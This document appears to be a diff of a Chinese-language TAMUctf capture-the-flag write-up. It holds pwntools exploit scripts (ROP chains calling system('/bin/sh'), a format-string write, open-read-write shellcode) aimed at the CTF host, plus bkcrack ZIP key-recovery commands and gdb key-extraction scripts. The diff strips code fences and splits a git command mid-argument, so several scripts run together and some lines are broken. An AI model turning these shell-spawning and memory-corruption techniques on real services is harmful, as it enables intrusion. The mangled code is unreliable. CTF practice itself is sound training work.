@@ -142,7 +142,8 @@ io = remote("tamuctf.com", 443, ssl=True, sni="tamuctf_rop-thirteen")
 
 rax_ret = 0x000000000040cc26
 rbp_ret = 0x000000000045f34d
-rdi_xxx_ret = 0x000000000047ea5c# pop rdi; or byte ptr [rax - 1], cl; ret;
+rdi_xxx_ret = 0x000000000047ea5c
+# pop rdi; or byte ptr [rax - 1], cl; ret;
 rdx_ret = 0x00000000004801bd
 rsi_ret = 0x000000000041cf18
 rsp_ret = 0x0000000000438d50
@@ -329,7 +330,8 @@ bkcrack -C deflated.zip -k f2635bca a91bec3a ec81bdf9 -D decrypted.zip
 
 然后解压出来的print_flag.py文件中是一个艺术字，不是flag，猜测被人改过，git show发现被改过，所以恢复一手，拿到flag
 
-git show 01c525a:print_flag.py > print_flag.py
+git show 01c525a:
+print_flag.py > print_flag.py
 
 ❝
 
@@ -544,7 +546,8 @@ set confirm off
 
 # 输出文件（二进制格式）
 set$outfile = "all_keys.bin"
-shell rm -f $outfile# 清空旧文件
+shell rm -f $outfile
+# 清空旧文件
 
 define extract_keys
     set$frame = 4
@@ -651,11 +654,6 @@ sh_addr = libc_base + next(libc.search(b"/bin/shx00"))
 rdi_ret = libc_base + next(libc.search(b"x5FxC3"))
 io.send(b"A" * 0x68 + p64(rdi_ret) + p64(sh_addr) + p64(system))
 io.interactive()
-```
-
-
-
-```
 from pwn import *
 import re
 
@@ -669,11 +667,6 @@ io.sendline(f"%{0xAA}c%11$hhn%{0xA0A-0xAA}c%10$hn%20$saaa".encode()+p64(flag_add
 print(re.findall(b"gigem{.*}",io.recvuntil(b"}"))[0])
 
 # io.interactive()
-```
-
-
-
-```
 from pwn import *
 import re
 
@@ -682,7 +675,8 @@ io = remote("tamuctf.com", 443, ssl=True, sni="tamuctf_rop-thirteen")
 
 rax_ret = 0x000000000040cc26
 rbp_ret = 0x000000000045f34d
-rdi_xxx_ret = 0x000000000047ea5c# pop rdi; or byte ptr [rax - 1], cl; ret;
+rdi_xxx_ret = 0x000000000047ea5c
+# pop rdi; or byte ptr [rax - 1], cl; ret;
 rdx_ret = 0x00000000004801bd
 rsi_ret = 0x000000000041cf18
 rsp_ret = 0x0000000000438d50
@@ -718,11 +712,6 @@ sleep(0.5)
 io.send(b"/bin/shx00")
 
 io.interactive()
-```
-
-
-
-```
 from pwn import *
 
 context.log_level = "debug"
@@ -760,11 +749,6 @@ orw += asm(shellcraft.amd64.write(1, 'rsp', 0x100))
 io.send(orw)
 
 io.interactive()
-```
-
-
-
-```
 from pwn import *
 
 context.log_level = "debug"
@@ -818,24 +802,10 @@ pl = p64(rdi_ret) + p64(sh_addr) + p64(sys_addr)
 io.sendline(pl)
 
 io.interactive()
-```
-
-
-
-```
 bkcrack -C deflated.zip -c .git/HEAD -p HEAD.txt
 bkcrack -C deflated.zip -k f2635bca a91bec3a ec81bdf9 -D decrypted.zip
-```
-
-
-
-```
-git show 01c525a:print_flag.py > print_flag.py
-```
-
-
-
-```
+git show 01c525a:
+print_flag.py > print_flag.py
 import hashlib
 from z3 import *
 
@@ -919,11 +889,6 @@ if brain.brainstem() == "4fe4bdc54342d22189d129d291d4fa23da12f22a45bca01e75a1f
     print("Flag:", flag.decode())
 else:
     print("哈希验证失败")
-```
-
-
-
-```
 from hashlib import sha256
 
 class Brain:
@@ -985,28 +950,19 @@ for i in range(4):
     brain.neurons[-1]=required_thoughts[i]
     
 print(brain.brainstem())
-```
-
-
-
-```
 bt # 查看调用栈
 frame 5 # 切换到5栈帧
 print key # 输出key
 x/59xb key # 查看key区域的59个字节
 info locals # 查看局部变量
-```
-
-
-
-```
 # test.gdb文件
 set pagination off
 set confirm off
 
 # 输出文件（二进制格式）
 set$outfile = "all_keys.bin"
-shell rm -f $outfile# 清空旧文件
+shell rm -f $outfile
+# 清空旧文件
 
 define extract_keys
     set$frame = 4
@@ -1031,11 +987,6 @@ end
 extract_keys
 echo"All keys saved to " + $outfile + "n"
 quit
-```
-
-
-
-```
 with open('outfile','rb') as f1,open('encrypted_flag.bin','rb') as f2:
     s1=f1.read()
     s2=f2.read()
@@ -1046,11 +997,6 @@ for i in range(1000):
         s2[j]^=s1[i*59+j]
         
 print(bytes(s2))
-```
-
-
-
-```
 from hashlib import sha256
 from Crypto.Util.number import*
 
